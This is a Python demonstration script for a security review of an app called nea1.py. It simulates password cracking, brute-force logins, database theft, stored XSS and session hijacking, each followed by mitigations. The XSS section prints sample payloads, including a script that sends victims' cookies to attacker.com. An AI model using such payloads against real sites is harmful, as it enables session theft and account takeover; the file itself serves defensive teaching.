#!/usr/bin/env python3
"""
Attack Scenario Demonstrations for nea1.py
This file demonstrates specific attack vectors and their potential impact
"""

import hashlib
import sqlite3
import tempfile
import os

class AttackDemonstrations:
    """Demonstrates various attack scenarios against the application"""
    
    def __init__(self):
        self.results = []
    
    def print_header(self, title):
        """Print formatted section header"""
        print("\n" + "="*80)
        print(f" {title}")
        print("="*80 + "\n")
    
    # ==================== ATTACK SCENARIO 1: PASSWORD CRACKING ====================
    
    def demo_password_cracking(self):
        """Demonstrate how unsalted SHA256 passwords can be cracked"""
        self.print_header("ATTACK SCENARIO 1: PASSWORD CRACKING")
        
        print("Scenario: Attacker gains access to database file (login.db)")
        print("Goal: Crack user passwords from hashed values\n")
        
        # Simulate common passwords and their hashes
        common_passwords = [
            "password123", "Password1", "Admin123456", "Welcome123",
            "Qwerty123456", "Password123", "Liverpool1",
            "Football1", "Computer1", "Superman1"
        ]
        
        print("Step 1: Extract password hashes from database")
        print("-" * 80)
        print("User | Email | Password Hash (SHA256)")
        print("-" * 80)
        
        simulated_users = [
            ("John Smith", "john@example.com", "password123"),
            ("Admin User", "admin@company.com", "Admin123456"),
            ("Jane Doe", "jane@example.com", "Password1"),
        ]
        
        user_hashes = {}
        for name, email, pwd in simulated_users:
            hash_value = hashlib.sha256(pwd.encode()).hexdigest()
            user_hashes[email] = (name, hash_value, pwd)
            print(f"{name} | {email} | {hash_value}")
        
        print("\nStep 2: Attempt to crack passwords using rainbow table")
        print("-" * 80)
        
        # Build "rainbow table" (simulated)
        rainbow_table = {}
        for pwd in common_passwords:
            rainbow_table[hashlib.sha256(pwd.encode()).hexdigest()] = pwd
        
        print(f"Rainbow table built with {len(rainbow_table)} common passwords")
        print("\nStep 3: Match hashes against rainbow table")
        print("-" * 80)
        
        cracked_count = 0
        for email, (name, hash_val, actual_pwd) in user_hashes.items():
            if hash_val in rainbow_table:
                cracked_pwd = rainbow_table[hash_val]
                cracked_count += 1
                print(f"✓ CRACKED: {email} -> Password: '{cracked_pwd}'")
            else:
                print(f"✗ Not in rainbow table: {email}")
        
        print("\n" + "="*80)
        print(f"RESULT: {cracked_count}/{len(user_hashes)} passwords cracked instantly!")
        print("="*80)
        print("\nIMPACT: With a comprehensive rainbow table (billions of hashes),")
        print("an attacker could crack most passwords in seconds.")
        print("\nMITIGATION: Use bcrypt with unique salt per password.")
        
        # Demonstrate bcrypt (if available)
        try:
            import bcrypt
            print("\n" + "-"*80)
            print("BCRYPT DEMONSTRATION (Secure Alternative):")
            print("-"*80)
            password = "password123"
            # Generate salt and hash
            salt = bcrypt.gensalt()
            hashed = bcrypt.hashpw(password.encode(), salt)
            print(f"Password: {password}")
            print(f"Bcrypt hash: {hashed.decode()}")
            print(f"Salt is embedded: {hashed[:29].decode()}")
            print("\nEven if two users have the same password, hashes will differ:")
            hashed2 = bcrypt.hashpw(password.encode(), bcrypt.gensalt())
            print(f"Same password, different hash: {hashed2.decode()}")
            print("\n✓ Rainbow tables are ineffective against bcrypt!")
        except ImportError:
            print("\n[Note: Install bcrypt to see secure alternative: pip install bcrypt]")
    
    # ==================== ATTACK SCENARIO 2: BRUTE FORCE ====================
    
    def demo_brute_force_attack(self):
        """Demonstrate brute force attack without rate limiting"""
        self.print_header("ATTACK SCENARIO 2: BRUTE FORCE ATTACK")
        
        print("Scenario: Attacker attempts to guess a user's password")
        print("Goal: Try many password combinations until success\n")
        
        print("Target: admin@company.com")
        print("Method: Automated password guessing\n")
        
        print("Step 1: Generate common password list")
        print("-" * 80)
        
        password_attempts = [
            "admin", "admin123", "Admin123", "admin1234",
            "Admin1234", "Admin123456", "password", "Password1",
            "password123", "Password123", "Welcome123", "Welcome1"
        ]
        
        print(f"Generated {len(password_attempts)} common passwords to try\n")
        
        print("Step 2: Automated login attempts (no rate limiting)")
        print("-" * 80)
        
        actual_password = "Admin123456"
        actual_hash = hashlib.sha256(actual_password.encode()).hexdigest()
        
        for i, attempt in enumerate(password_attempts, 1):
            attempt_hash = hashlib.sha256(attempt.encode()).hexdigest()
            if attempt_hash == actual_hash:
                print(f"Attempt {i}: '{attempt}' - ✓ SUCCESS! Password found!")
                break
            else:
                print(f"Attempt {i}: '{attempt}' - ✗ Failed")
        
        print("\n" + "="*80)
        print(f"RESULT: Password cracked in {i} attempts!")
        print("="*80)
        print(f"\nTime taken: ~{i * 0.1} seconds (assuming 0.1s per attempt)")
        print("No delays, no lockouts, no CAPTCHA challenges.")
        
        print("\nWith current implementation:")
        print("  - Can try unlimited passwords")
        print("  - No delay between attempts")
        print("  - No account lockout")
        print("  - No alert to user")
        
        print("\nPotential attack scale:")
        print("  - 10 attempts/second = 36,000 attempts/hour")
        print("  - 864,000 attempts/day")
        print("  - Common passwords cracked in minutes")
        
        print("\nMITIGATION:")
        print("  1. Limit to 5 attempts per 15 minutes")
        print("  2. Lock account after 10 failed attempts")
        print("  3. Add CAPTCHA after 3 failures")
        print("  4. Send email alerts on failed attempts")
    
    # ==================== ATTACK SCENARIO 3: DATABASE THEFT ====================
    
    def demo_database_theft(self):
        """Demonstrate impact of database file theft"""
        self.print_header("ATTACK SCENARIO 3: DATABASE FILE THEFT")
        
        print("Scenario: Attacker gains access to the server/computer")
        print("Goal: Steal the entire database file\n")
        
        print("Step 1: Locate database file")
        print("-" * 80)
        print("Database location: ./login.db (current directory)")
        print("File is unencrypted SQLite database")
        print("No special permissions required to read\n")
        
        print("Step 2: Copy database file")
        print("-" * 80)
        print("$ cp login.db /tmp/stolen_database.db")
        print("✓ Database copied successfully\n")
        
        print("Step 3: Extract all data")
        print("-" * 80)
        
        # Create a demo database
        fd, temp_db = tempfile.mkstemp(suffix='.db')
        os.close(fd)
        
        db = sqlite3.connect(temp_db)
        cursor = db.cursor()
        
        # Create and populate with sample data
        cursor.execute("""CREATE TABLE users(
            id integer PRIMARY KEY AUTOINCREMENT,
            Name text NOT NULL,
            Email text NOT NULL,
            Password text NOT NULL,
            quiz_taken BOOLEAN DEFAULT 0
        )""")
        
        sample_users = [
            ("John Smith", "john@example.com", hashlib.sha256("password123".encode()).hexdigest()),
            ("Jane Doe", "jane@example.com", hashlib.sha256("Welcome123".encode()).hexdigest()),
            ("Admin User", "admin@example.com", hashlib.sha256("Admin123456".encode()).hexdigest()),
        ]
        
        for name, email, pwd_hash in sample_users:
            cursor.execute("INSERT INTO users (Name, Email, Password) VALUES (?, ?, ?)",
                         (name, email, pwd_hash))
        db.commit()
        
        # "Attacker" reads the database
        print("$ sqlite3 stolen_database.db 'SELECT * FROM users;'")
        print("\nExtracted data:")
        print("-" * 80)
        cursor.execute("SELECT id, Name, Email, Password FROM users")
        
        for row in cursor.fetchall():
            print(f"ID: {row[0]} | Name: {row[1]} | Email: {row[2]}")
            print(f"  Password Hash: {row[3]}")
        
        db.close()
        os.unlink(temp_db)
        
        print("\n" + "="*80)
        print("RESULT: Complete user database compromised!")
        print("="*80)
        
        print("\nData exposed:")
        print("  ✓ All user names")
        print("  ✓ All email addresses")
        print("  ✓ All password hashes (vulnerable to cracking)")
        print("  ✓ Quiz answers (if stored)")
        print("  ✓ Saved universities")
        
        print("\nAttacker can now:")
        print("  1. Crack passwords using rainbow tables")
        print("  2. Use emails for phishing attacks")
        print("  3. Sell data on dark web")
        print("  4. Access other accounts (password reuse)")
        
        print("\nMITIGATION:")
        print("  1. Encrypt database with SQLCipher")
        print("  2. Set strict file permissions (chmod 600)")
        print("  3. Store database in secure location")
        print("  4. Implement database-level encryption")
        print("  5. Use strong password hashing (bcrypt)")
    
    # ==================== ATTACK SCENARIO 4: XSS ATTACK ====================
    
    def demo_xss_attack(self):
        """Demonstrate XSS attack through stored data"""
        self.print_header("ATTACK SCENARIO 4: STORED XSS ATTACK")
        
        print("Scenario: Attacker injects malicious JavaScript")
        print("Goal: Execute code in other users' browsers\n")
        
        print("Step 1: Identify injection points")
        print("-" * 80)
        print("Vulnerable fields:")
        print("  1. University names (saved_universities)")
        print("  2. User names (displayed in UI)")
        print("  3. Quiz answers (potentially displayed)")
        print()
        
        print("Step 2: Craft malicious payload")
        print("-" * 80)
        
        payloads = [
            "<script>alert('XSS Vulnerability!')</script>",
            "<img src=x onerror='alert(document.cookie)'>",
            "<iframe src='javascript:alert(\"Hacked!\")'></iframe>",
            "<body onload='alert(\"XSS\")'>",
        ]
        
        for i, payload in enumerate(payloads, 1):
            print(f"{i}. {payload}")
        
        print("\nStep 3: Inject payload into database")
        print("-" * 80)
        print("Example: Save malicious 'university name'")
        print("Input: <script>document.location='http://attacker.com?cookie='+document.cookie</script>")
        print("✓ Stored in database without sanitization\n")
        
        print("Step 4: Victim views the data")
        print("-" * 80)
        print("When victim opens 'Saved Universities' page:")
        print("  1. Application fetches data from database")
        print("  2. Displays university name in CTkLabel")
        print("  3. If HTML is interpreted: SCRIPT EXECUTES")
        print("  4. Attacker receives victim's cookies/session")
        
        print("\n" + "="*80)
        print("RESULT: Attacker can steal sessions and impersonate users!")
        print("="*80)
        
        print("\nPotential impact:")
        print("  ✓ Session hijacking")
        print("  ✓ Cookie theft")
        print("  ✓ Keylogging")
        print("  ✓ Phishing")
        print("  ✓ Malware distribution")
        print("  ✓ Defacement")
        
        print("\nMITIGATION:")
        print("  1. HTML escape all user input before display:")
        print("     import html")
        print("     safe_text = html.escape(user_input)")
        print("  2. Validate input format strictly")
        print("  3. Implement Content Security Policy")
        print("  4. Use parameterized queries (already done ✓)")
    
    # ==================== ATTACK SCENARIO 5: SESSION HIJACKING ====================
    
    def demo_session_hijacking(self):
        """Demonstrate session management vulnerabilities"""
        self.print_header("ATTACK SCENARIO 5: SESSION HIJACKING")
        
        print("Scenario: Attacker steals an active session")
        print("Goal: Impersonate logged-in user\n")
        
        print("Current session management:")
        print("-" * 80)
        print("  - User ID stored in: self.current_user_id")
        print("  - No session token")
        print("  - No timeout mechanism")
        print("  - No session validation")
        print()
        
        print("Step 1: User logs in successfully")
        print("-" * 80)
        print("self.current_user_id = 42")
        print("User is now authenticated")
        print("Session never expires\n")
        
        print("Step 2: User leaves computer unlocked")
        print("-" * 80)
        print("Application remains open and authenticated")
        print("No automatic logout after inactivity")
        print("Attacker approaches computer\n")
        
        print("Step 3: Attacker uses active session")
        print("-" * 80)
        print("✓ Access all user data")
        print("✓ View saved universities")
        print("✓ Modify quiz answers")
        print("✓ Delete saved items")
        print("✓ Export personal information")
        
        print("\nAlternate attack vector:")
        print("-" * 80)
        print("If application state could be dumped:")
        print("  current_user_id = 42")
        print("Attacker could set their session to this ID")
        
        print("\n" + "="*80)
        print("RESULT: Easy session hijacking without detection!")
        print("="*80)
        
        print("\nVulnerabilities:")
        print("  ✗ No session expiration")
        print("  ✗ No session token validation")
        print("  ✗ No re-authentication for sensitive actions")
        print("  ✗ No session activity logging")
        
        print("\nMITIGATION:")
        print("  1. Implement session tokens (random, unique)")
        print("  2. Add 30-minute inactivity timeout")
        print("  3. Require re-auth for sensitive actions")
        print("  4. Log all session activity")
        print("  5. Implement 'Sign out all devices' feature")
    
    # ==================== RUN ALL DEMONSTRATIONS ====================
    
    def run_all_demonstrations(self):
        """Run all attack demonstrations"""
        print("\n" + "╔" + "="*78 + "╗")
        print("║" + " "*20 + "ATTACK SCENARIO DEMONSTRATIONS" + " "*28 + "║")
        print("║" + " "*25 + "nea1.py Security Analysis" + " "*28 + "║")
        print("╚" + "="*78 + "╝")
        
        print("\nThis demonstration shows how identified vulnerabilities")
        print("can be exploited by attackers in real-world scenarios.\n")
        
        input("Press Enter to begin demonstrations...")
        
        # Run all demonstrations
        self.demo_password_cracking()
        input("\n\nPress Enter to continue to next scenario...")
        
        self.demo_brute_force_attack()
        input("\n\nPress Enter to continue to next scenario...")
        
        self.demo_database_theft()
        input("\n\nPress Enter to continue to next scenario...")
        
        self.demo_xss_attack()
        input("\n\nPress Enter to continue to next scenario...")
        
        self.demo_session_hijacking()
        
        # Final summary
        self.print_header("SUMMARY OF ATTACK SCENARIOS")
        
        print("Five attack scenarios demonstrated:")
        print("\n1. PASSWORD CRACKING")
        print("   └─ Unsalted SHA256 enables rainbow table attacks")
        print("\n2. BRUTE FORCE ATTACK")
        print("   └─ No rate limiting allows unlimited login attempts")
        print("\n3. DATABASE FILE THEFT")
        print("   └─ Unencrypted database exposes all user data")
        print("\n4. STORED XSS ATTACK")
        print("   └─ Unsanitized input enables code injection")
        print("\n5. SESSION HIJACKING")
        print("   └─ Weak session management allows impersonation")
        
        print("\n" + "="*80)
        print("CONCLUSION")
        print("="*80)
        print("\nAll demonstrated attacks are PREVENTABLE with proper")
        print("security implementations. Refer to SECURITY_FINDINGS.md")
        print("for detailed remediation steps.")
        print("\n" + "="*80 + "\n")


def main():
    """Main entry point"""
    demo = AttackDemonstrations()
    demo.run_all_demonstrations()


if __name__ == "__main__":
    main()
